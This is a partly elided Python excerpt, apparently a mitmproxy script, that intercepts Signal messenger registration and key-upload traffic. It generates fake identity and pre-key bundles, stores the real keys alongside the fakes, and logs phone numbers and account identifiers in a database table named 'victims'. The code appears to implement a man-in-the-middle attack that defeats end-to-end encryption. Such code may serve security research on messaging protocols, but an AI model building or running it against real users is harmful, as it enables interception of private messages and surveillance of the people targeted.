...
def fake_key_gen():
    ...
    p = subprocess.Popen(['node', './node-signal/index.js', '100'], stdout=subprocess.PIPE)
    out = p.stdout.read()

    keys = json.loads(out)

    identity_key = (keys["identityKey"]["privateKey"], keys["identityKey"]["publicKey"])
    signedPre_key = (keys["signedPreKey"]["privateKey"], keys["signedPreKey"]["publicKey"], keys["signedPreKey"]["signature"])
...
def request(flow: http.HTTPFlow):
    ...
    if "/v2/keys/" in flow.request.path and flow.request.method == "PUT":
        ...
        IdenKey, SignedPreKey, PreKeys = keys["identityKey"], json.dumps(keys["signedPreKey"]), json.dumps(keys["preKeys"])
        ...
        params =(IdenKey, SignedPreKey,PreKeys,fake_IdenKey,fake_SignedPreKey,fake_PreKeys, target, target)
...
def response(flow : http.HTTPFlow):
    ...
    if "/v1/registration" in flow.request.path and flow.request.method == "POST":
        ...
        cur = conn.cursor()
        try:
            pNumber, aci, pni, unidentifiedAccessKey = resp["number"], resp["uuid"], resp["pni"], req["accountAttributes"]["unidentifiedAccessKey"]
            cur.execute(f"""INSERT INTO victims (pNumber, aci, pni, unidentifiedAccessKey, aciIdenKey, pniIdenKey, aciSignedPreKey, pniSignedPreKey, aciPreKeys, pniPreKeys,aciFakeIdenKey, pniFakeIdenKey, aciFakeSignedPreKey, pniFakeSignedPreKey, aciFakePrekeys, pniFakePreKeys) VALUES (?, ?, ?, ?, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )""", (pNumber,aci,pni, unidentifiedAccessKey))
            conn.commit()     
        except Exception:
            pass
    ...
    if matches and flow.request.method == "GET":
        ...
        if target is None or target == "":
            ...
            res = cur.execute("SELECT aci FROM victims WHERE UnidentifiedAccessKey LIKE ? ", (bearer,))
            target = res.fetchone()[0]
            ctx.log(f"target : {target!r}")
            
        
        for device in info['devices']:
            params = (device['deviceId'], target, receiver, json.dumps(info['identityKey']), json.dumps(device['signedPreKey']), json.dumps(device['preKey']), fake_IdenKey, fake_SignedPreKey, fake_PreKeys)
            #ctx.log(params)
            cur.execute(f"UPDATE end2end SET deviceId = ?, v_aci = ?, recv_aci = ?, recv_IdenKey = ?, recv_SignedPreKey = ?, recv_PreKey = ?, recv_FakeIdenKey = ?, recv_FakeSignedPreKey = ?, recv_FakePreKey = ? WHERE recv_aci = ?", params + (receiver, ))
            cur.execute("INSERT OR IGNORE INTO end2end (deviceId, v_aci, recv_aci, recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey) VALUES (?,?,?,?,?,?,?,?,?)", params)
